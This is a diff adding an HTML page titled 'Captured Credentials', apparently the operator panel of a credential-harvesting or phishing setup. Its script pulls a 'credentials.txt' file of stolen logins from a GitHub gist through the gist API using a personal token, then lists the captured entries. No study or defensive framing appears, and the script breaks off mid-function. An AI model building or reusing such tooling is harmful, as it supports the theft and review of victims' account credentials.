@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>View Credentials</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 20px;
+            background-color: #f5f5f5;
+        }
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            background: white;
+            padding: 20px;
+            border-radius: 5px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+        }
+        h1 {
+            color: #333;
+        }
+        .credential {
+            border: 1px solid #ddd;
+            padding: 15px;
+            margin: 10px 0;
+            border-radius: 5px;
+            background-color: #f9f9f9;
+        }
+        .credential p {
+            margin: 5px 0;
+        }
+        .credential strong {
+            color: #333;
+        }
+        .no-credentials {
+            text-align: center;
+            color: #666;
+            padding: 20px;
+        }
+        .refresh-btn {
+            background-color: #4CAF50;
+            color: white;
+            border: none;
+            padding: 10px 15px;
+            border-radius: 4px;
+            cursor: pointer;
+            margin-right: 10px;
+        }
+        .refresh-btn:hover {
+            background-color: #45a049;
+        }
+        .loading {
+            text-align: center;
+            color: #666;
+            padding: 20px;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h1>Captured Credentials</h1>
+    <div id="credentials"></div>
+    <button class="refresh-btn" onclick="loadCredentials()">Refresh</button>
+</div>
+
+<script>
+    // Replace YOUR_GITHUB_TOKEN with your actual token
+    const githubToken = 'YOUR_GITHUB_TOKEN';
+    
+    // Replace YOUR_GIST_ID with your actual gist ID
+    const gistId = 'YOUR_GIST_ID';
+    
+    function loadCredentials() {
+        const container = document.getElementById('credentials');
+        container.innerHTML = '<div class="loading">Loading credentials...</div>';
+        
+        fetch(`https://api.github.com/gists/${gistId}`, {
+            headers: {
+                'Authorization': `token ${githubToken}`
+            }
+        })
+        .then(response => response.json())
+        .then(data => {
+            const content = data.files['credentials.txt'].content;
+            const lines = content.split('\n');
+            
+            if (lines.length <= 1) {
+                container.innerHTML = '<div class="no-credentials">No credentials captured yet.</div>';
+                return;
+            }
+            
+            container.innerHTML = '';});}
